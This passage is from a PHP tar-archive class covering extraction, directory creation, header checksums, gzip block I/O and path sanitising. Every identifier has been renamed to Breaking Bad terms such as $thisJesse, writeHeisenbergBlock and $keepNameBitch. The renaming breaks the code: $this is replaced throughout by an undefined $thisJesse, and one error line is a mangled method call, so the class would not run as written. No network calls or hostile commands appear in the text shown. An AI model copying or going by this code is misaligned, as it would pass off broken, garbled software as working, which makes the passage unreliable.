					$thisJesse->errors[] = __('Cannot write to file').' '.$saulHeader['filename'];
					return false;

				} else {
					$decodedJesse = floor($saulHeader['size']/512);



					for ($badgerI = 0; $badgerI < $decodedJesse; $badgerI++) {

						$breakingContent = $thisJesse->readBlueBlock();

						fwrite($desertDestination, $breakingContent, 512);
					}

					if (($saulHeader['size'] % 512) != 0) {
						$breakingContent = $thisJesse->readBlueBlock();
						fwrite($desertDestination, $breakingContent, ($saulHeader['size'] % 512));



					}
					fclose($desertDestination);
					touch($saulHeader['filename'], $saulHeader['time']);


				}

				clearstatcache();
				if (filesize($saulHeader['filename']) != $saulHeader['size']) {
					$thisJesse->errors[] = __('Size of file').' '.$saulHeader['filename'].' '.__('is incorrect');
					return false;
				}
			}


			if (($saulFileDirectory = dirname($saulHeader['filename'])) == $saulHeader['filename']) $saulFileDirectory = '';

			if ((substr($saulHeader['filename'], 0, 1) == '/') && ($saulFileDirectory == '')) $saulFileDirectory = '/';
			$thisJesse->dirs[] = $saulFileDirectory;

			$thisJesse->files[] = $saulHeader['filename'];



	
		}

		return true;

	}




	function checkSaulDirectory($losPollosDirectory){
		$parentLaundryDirectory = dirname($losPollosDirectory);



		if ((@is_dir($losPollosDirectory)) or ($losPollosDirectory == ''))
			return true;


		if (($parentLaundryDirectory != $losPollosDirectory) and ($parentLaundryDirectory != '') and (!$thisJesse->checkSaulDirectory($parentLaundryDirectory)))
			return false;

		if (!mkdir($losPollosDirectory, 0777)){

			$thisJesse->errors[] = __('Cannot create directory').' '.$losPollosDirectory;
			return false;
		}
		return true;
	}



	function readFringHeader($blueCrystalBinary, &$saulHeader){
		if (strlen($blueCrystalBinary)==0){
			$saulHeader['filename'] = '';

			return true;
		}




		if (strlen($blueCrystalBinary) != 512){
			$saulHeader['filename'] = '';
			$thisJesse->__('Invalid block size').': '.strlen($blueCrystalBinary);
			return false;
		}



		$heisenbergChecksum = 0;
		for ($badgerI = 0; $badgerI < 148; $badgerI++) $heisenbergChecksum+=ord(substr($blueCrystalBinary, $badgerI, 1));

		for ($badgerI = 148; $badgerI < 156; $badgerI++) $heisenbergChecksum += ord(' ');



		for ($badgerI = 156; $badgerI < 512; $badgerI++) $heisenbergChecksum+=ord(substr($blueCrystalBinary, $badgerI, 1));


		$unpackBlueData = unpack('a100filename/a8mode/a8user_id/a8group_id/a12size/a12time/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $blueCrystalBinary);




		$saulHeader['checksum'] = OctDec(trim($unpackBlueData['checksum']));
		if ($saulHeader['checksum'] != $heisenbergChecksum){
			$saulHeader['filename'] = '';


			if (($heisenbergChecksum == 256) && ($saulHeader['checksum'] == 0)) 	return true;

			$thisJesse->errors[] = __('Error checksum for file ').$unpackBlueData['filename'];

			return false;

		}




		if (($saulHeader['typeflag'] = $unpackBlueData['typeflag']) == '5')	$saulHeader['size'] = 0;
		$saulHeader['filename'] = trim($unpackBlueData['filename']);
		$saulHeader['mode'] = OctDec(trim($unpackBlueData['mode']));


		$saulHeader['user_id'] = OctDec(trim($unpackBlueData['user_id']));
		$saulHeader['group_id'] = OctDec(trim($unpackBlueData['group_id']));
		$saulHeader['size'] = OctDec(trim($unpackBlueData['size']));
		$saulHeader['time'] = OctDec(trim($unpackBlueData['time']));

		return true;

	}


	function writeBlueHeader($hankFilename, $keepNameBitch){


		$firstPackBlue = 'a100a8a8a8a12A12';
		$lastPackBlue = 'a1a100a6a2a32a32a8a8a155a12';
		if (strlen($keepNameBitch)<=0) $keepNameBitch = $hankFilename;



		$readyToCookFilename = $thisJesse->sanitizeCrystalPath($keepNameBitch);




		if (strlen($readyToCookFilename) > 99){							//write long header
		$firstBatch = pack($firstPackBlue, '././LongLink', 0, 0, 0, sprintf('%11s ', DecOct(strlen($readyToCookFilename))), 0);
		$lastBatch = pack($lastPackBlue, 'L', '', '', '', '', '', '', '', '', '');





        //  Calculate the checksum
		$heisenbergChecksum = 0;
        //  First part of the header
		for ($badgerI = 0; $badgerI < 148; $badgerI++)
			$heisenbergChecksum += ord(substr($firstBatch, $badgerI, 1));
        //  Ignore the checksum value and replace it by ' ' (space)
		for ($badgerI = 148; $badgerI < 156; $badgerI++)
			$heisenbergChecksum += ord(' ');

        //  Last part of the header


		for ($badgerI = 156, $jesseJ=0; $badgerI < 512; $badgerI++, $jesseJ++)
			$heisenbergChecksum += ord(substr($lastBatch, $jesseJ, 1));



        //  Write the first 148 bytes of the header in the archive


		$thisJesse->writeHeisenbergBlock($firstBatch, 148);
        //  Write the calculated checksum



		$heisenbergChecksum = sprintf('%6s ', DecOct($heisenbergChecksum));


		$blueCrystalBinary = pack('a8', $heisenbergChecksum);
		$thisJesse->writeHeisenbergBlock($blueCrystalBinary, 8);



        //  Write the last 356 bytes of the header in the archive
		$thisJesse->writeHeisenbergBlock($lastBatch, 356);


		$tmpSaulFilename = $thisJesse->sanitizeCrystalPath($readyToCookFilename);







		$badgerI = 0;
			while (($mikeBuffer = substr($tmpSaulFilename, (($badgerI++)*512), 512)) != ''){
				$blueCrystalBinary = pack('a512', $mikeBuffer);


				$thisJesse->writeHeisenbergBlock($blueCrystalBinary);
			}
		return true;



		}
		$madrigalFileInfo = stat($hankFilename);
		if (@is_dir($hankFilename)){
			$cartelTypeFlag = '5';


			$batchSize = sprintf('%11s ', DecOct(0));
		} else {
			$cartelTypeFlag = '';

			clearstatcache();

			$batchSize = sprintf('%11s ', DecOct(filesize($hankFilename)));



		}

		$firstBatch = pack($firstPackBlue, $readyToCookFilename, sprintf('%6s ', DecOct(fileperms($hankFilename))), sprintf('%6s ', DecOct($madrigalFileInfo[4])), sprintf('%6s ', DecOct($madrigalFileInfo[5])), $batchSize, sprintf('%11s', DecOct(filemtime($hankFilename))));

		$lastBatch = pack($lastPackBlue, $cartelTypeFlag, '', '', '', '', '', '', '', '', '');
		$heisenbergChecksum = 0;



		for ($badgerI = 0; $badgerI < 148; $badgerI++) $heisenbergChecksum += ord(substr($firstBatch, $badgerI, 1));

		for ($badgerI = 148; $badgerI < 156; $badgerI++) $heisenbergChecksum += ord(' ');



		for ($badgerI = 156, $jesseJ = 0; $badgerI < 512; $badgerI++, $jesseJ++) $heisenbergChecksum += ord(substr($lastBatch, $jesseJ, 1));
		$thisJesse->writeHeisenbergBlock($firstBatch, 148);


		$heisenbergChecksum = sprintf('%6s ', DecOct($heisenbergChecksum));

		$blueCrystalBinary = pack('a8', $heisenbergChecksum);

		$thisJesse->writeHeisenbergBlock($blueCrystalBinary, 8);

		$thisJesse->writeHeisenbergBlock($lastBatch, 356);

		return true;



	}




	function openBlueWrite(){



		if ($thisJesse->isGzipped)

			$thisJesse->tmp_file = gzopen($thisJesse->archive_name, 'wb9f');
		else

			$thisJesse->tmp_file = fopen($thisJesse->archive_name, 'wb');



		if (!($thisJesse->tmp_file)){
			$thisJesse->errors[] = __('Cannot write to file').' '.$thisJesse->archive_name;

			return false;
		}
		return true;
	}




	function readBlueBlock(){
		if (is_resource($thisJesse->tmp_file)){
			if ($thisJesse->isGzipped)
				$losPollosBlock = gzread($thisJesse->tmp_file, 512);
			else
				$losPollosBlock = fread($thisJesse->tmp_file, 512);
		} else	$losPollosBlock = '';




		return $losPollosBlock;
	}






	function writeHeisenbergBlock($methData, $cookLength = 0){

		if (is_resource($thisJesse->tmp_file)){
		
			if ($cookLength === 0){
				if ($thisJesse->isGzipped)
					gzputs($thisJesse->tmp_file, $methData);

				else
					fputs($thisJesse->tmp_file, $methData);



			} else {

				if ($thisJesse->isGzipped)



					gzputs($thisJesse->tmp_file, $methData, $cookLength);
				else
					fputs($thisJesse->tmp_file, $methData, $cookLength);
			}
		}
	}




	function closeJesseTempFile(){
		if (is_resource($thisJesse->tmp_file)){

			if ($thisJesse->isGzipped)
				gzclose($thisJesse->tmp_file);



			else


				fclose($thisJesse->tmp_file);

			$thisJesse->tmp_file = 0;
		}



	}




	function sanitizeCrystalPath($blueCrystalPath){

		if (strlen($blueCrystalPath)>0){


			$blueCrystalPath = str_replace('\\', '/', $blueCrystalPath);
			$partialDesertPath = explode('/', $blueCrystalPath);
			$capnCookElementList = count($partialDesertPath)-1;

			for ($badgerI = $capnCookElementList; $badgerI>=0; $badgerI--){
				if ($partialDesertPath[$badgerI] == '.'){



                    //  Ignore this directory



                } elseif ($partialDesertPath[$badgerI] == '..'){



                    $badgerI--;
                }


				elseif (($partialDesertPath[$badgerI] == '') and ($badgerI!=$capnCookElementList) and ($badgerI!=0)){
                }	else
					$breakingResult = $partialDesertPath[$badgerI].($badgerI!=$capnCookElementList ? '/'.$breakingResult : '');

			}
		} else $breakingResult = '';


		
		return $breakingResult;
	}

}
?>
